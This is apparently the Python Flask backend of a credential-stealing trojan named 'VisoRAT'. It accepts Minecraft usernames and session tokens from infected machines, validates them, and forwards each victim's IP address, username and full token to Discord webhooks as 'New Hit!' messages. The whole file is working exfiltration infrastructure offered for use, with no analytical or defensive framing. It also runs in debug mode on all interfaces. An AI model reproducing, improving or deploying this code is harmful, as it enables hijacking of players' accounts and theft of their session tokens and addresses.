from flask import Flask, request, jsonify
import requests
import json
import os
import time
from datetime import datetime

app = Flask(__name__)

ip_requests = {}
seen_tokens = set()

def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print("ERROR: config.json not found! Creating template...")
        default_config = {
            "security": {
                "rate_limit_seconds": 600,
                "min_token_length": 128,
                "check_duplicate_tokens": True
            },
            "endpoints": {
                "/receive": {
                    "webhooks": [
                        {
                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
                            "name": "VisoRAT",
                            "footer": "VisoRAT",
                            "color": 7414964,
                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                        }
                    ]
                }
            }
        }
        with open('config.json', 'w') as f:
            json.dump(default_config, f, indent=4)
        print("Created config.json template. Please configure your webhook URLs.")
        return default_config
    except json.JSONDecodeError:
        print("ERROR: Invalid config.json format!")
        return None

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers['X-Real-IP']
    else:
        ip = request.remote_addr
    return ip

def validate_player_head(username):
    try:
        url = f"https://minotar.net/helm/{username}/100.png"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            return url, True
        else:
            return None, False
    except Exception as e:
        print(f"Error validating player head for {username}: {e}")
        return None, False

def is_rate_limited(ip, rate_limit_seconds):
    current_time = time.time()
    if ip in ip_requests:
        last_request_time = ip_requests[ip]
        if current_time - last_request_time < rate_limit_seconds:
            return True
    ip_requests[ip] = current_time
    return False

def is_duplicate_token(token, check_duplicate):
    if not check_duplicate:
        return False
    
    if token in seen_tokens:
        return True
    
    seen_tokens.add(token)
    return False

def validate_request_data(username, token, ip, security_config):
    errors = []
    head_image_url = None
    
    rate_limit_seconds = security_config.get("rate_limit_seconds", 60)
    if is_rate_limited(ip, rate_limit_seconds):
        errors.append(f"Rate limited: Please wait {rate_limit_seconds} seconds between requests")
    
    min_token_length = security_config.get("min_token_length", 128)
    if not token or len(token) < min_token_length:
        errors.append(f"Token must be at least {min_token_length} characters long")
    
    if security_config.get("check_duplicate_tokens", True):
        if is_duplicate_token(token, True):
            errors.append("Duplicate token detected")
    
    if username:
        head_url, valid_username = validate_player_head(username)
        if not valid_username:
            errors.append("Invalid Minecraft username (player head not found)")
        else:
            head_image_url = head_url
    else:
        errors.append("Username is required")
    
    return errors, head_image_url

def send_to_discord_webhook(webhook_config, username, ip, token, endpoint, head_image_url=None):
    webhook_url = webhook_config.get('url')
    webhook_name = webhook_config.get('name', 'VisoRAT')
    webhook_footer = webhook_config.get('footer', 'VisoRAT')
    webhook_color = webhook_config.get('color', 7414964)
    webhook_avatar = webhook_config.get('avatar_url')
    
    if not webhook_url or webhook_url.startswith('YOUR_DISCORD_WEBHOOK_URL'):
        print(f"ERROR: Discord webhook URL not configured for {webhook_name}")
        return False

    try:
        description = f""".
🌐 **IP Address**:
```
{ip}
```

👤 **Username**:
```
{username}
```

🔑 **Minecraft Token**:
```
{token}
```
"""

        embed = {
            "title": f"🚨 New Hit! - {endpoint}",
            "color": webhook_color,
            "description": description,
            "footer": {
                "text": webhook_footer
            },
            "timestamp": datetime.utcnow().isoformat()
        }

        if head_image_url:
            embed["thumbnail"] = {"url": head_image_url}

        payload = {
            "username": webhook_name,
            "embeds": [embed]
        }
        
        if webhook_avatar and webhook_avatar != "https://example.com/avatar.png":
            payload["avatar_url"] = webhook_avatar

        response = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code in [200, 204]:
            print(f"Successfully sent data to Discord webhook: {webhook_name}")
            return True
        else:
            print(f"Failed to send to Discord webhook {webhook_name}: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"Error sending to Discord webhook {webhook_name}: {e}")
        return False

def send_to_all_webhooks(endpoint_config, username, ip, token, endpoint_path, head_image_url):
    if not endpoint_config or 'webhooks' not in endpoint_config:
        print(f"No webhooks configured for endpoint: {endpoint_path}")
        return []
    
    webhooks = endpoint_config.get('webhooks', [])
    results = []
    
    for webhook_config in webhooks:
        success = send_to_discord_webhook(webhook_config, username, ip, token, endpoint_path, head_image_url)
        results.append({
            "webhook_name": webhook_config.get('name', 'Unknown'),
            "success": success
        })
    
    return results

config = load_config()
if config and 'endpoints' in config:
    endpoints = config.get('endpoints', {})
    security_config = config.get('security', {})
    
    for endpoint_path, endpoint_config in endpoints.items():
        clean_path = endpoint_path.strip('/')
        
        def create_endpoint_handler(config=endpoint_config, path=clean_path, security=security_config):
            def handler():
                data = request.json

                required_fields = ['username', 'token']
                if not data or not all(field in data for field in required_fields):
                    return jsonify({
                        "status": "error",
                        "message": f"Missing required fields. Expected: {required_fields}",
                        "endpoint": path
                    }), 400

                username = data.get('username')
                token = data.get('token')
                
                ip = get_client_ip()

                print(f"Received on {path} - Username: {username}, IP: {ip}, Token length: {len(token) if token else 0}")

                validation_errors, head_image_url = validate_request_data(username, token, ip, security)
                if validation_errors:
                    return jsonify({
                        "status": "error",
                        "endpoint": path,
                        "errors": validation_errors
                    }), 400

                webhook_results = send_to_all_webhooks(config, username, ip, token, path, head_image_url)

                return jsonify({
                    "status": "success",
                    "endpoint": path,
                    "webhooks_sent": len([r for r in webhook_results if r['success']]),
                    "webhooks_total": len(webhook_results),
                    "webhook_results": webhook_results
                }), 200
            return handler
        
        handler_func = create_endpoint_handler()
        app.add_url_rule(f'/{clean_path}', endpoint=f'endpoint_{clean_path}', view_func=handler_func, methods=['POST'])
        print(f"Created endpoint: /{clean_path}")

def cleanup_old_ips():
    current_time = time.time()
    rate_limit_seconds = config.get('security', {}).get('rate_limit_seconds', 600) if config else 600
    cutoff_time = current_time - (rate_limit_seconds * 2)
    global ip_requests
    ip_requests = {ip: timestamp for ip, timestamp in ip_requests.items() if timestamp > cutoff_time}

if __name__ == '__main__':
    config = load_config()
    if config and 'endpoints' in config:
        print("\nConfigured endpoints:")
        for endpoint in config['endpoints'].keys():
            webhook_count = len(config['endpoints'][endpoint].get('webhooks', []))
            print(f"  {endpoint} -> {webhook_count} webhook(s)")
    
    if config and 'security' in config:
        security = config['security']
        print("\nSecurity settings:")
        print(f"  Rate limit: {security.get('rate_limit_seconds', 600)} seconds")
        print(f"  Min token length: {security.get('min_token_length', 128)} characters")
        print(f"  Check duplicate tokens: {security.get('check_duplicate_tokens', True)}")
        print("  Username validation: Via player head API")
    

    app.run(host='0.0.0.0', port=5000, debug=True)
